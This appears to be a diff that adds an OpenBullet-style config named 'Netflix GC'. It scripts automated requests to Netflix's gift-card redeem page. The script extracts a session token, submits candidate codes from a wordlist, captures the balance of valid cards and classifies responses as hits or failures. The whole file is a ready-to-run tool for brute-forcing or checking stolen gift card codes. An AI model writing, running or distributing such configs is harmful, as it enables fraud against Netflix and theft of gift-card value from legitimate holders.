@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Netflix GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-31T05:54:26.4317841+01:00",
+  "AdditionalInfo": "",
+  "Author": "FreakShock",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.netflix.com/redeem" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+PARSE "<SOURCE>" LR "authURL\" value=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://www.netflix.com/redeem" AutoRedirect=TRUE 
+  CONTENT "authURL=<TOKEN>&flow=giftCard&mode=redeem&action=nextAction&withFields=code&code=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: " 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+PARSE "<SOURCE>" LR "giftCreditValue\">" "</span>" Recursive=FALSE -> CAP "Balance" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The code entered is not valid" 
+    KEY "The code you entered has already been used" 
+  KEYCHAIN Success OR 
+    KEY "class=\"giftCreditValue\"" 
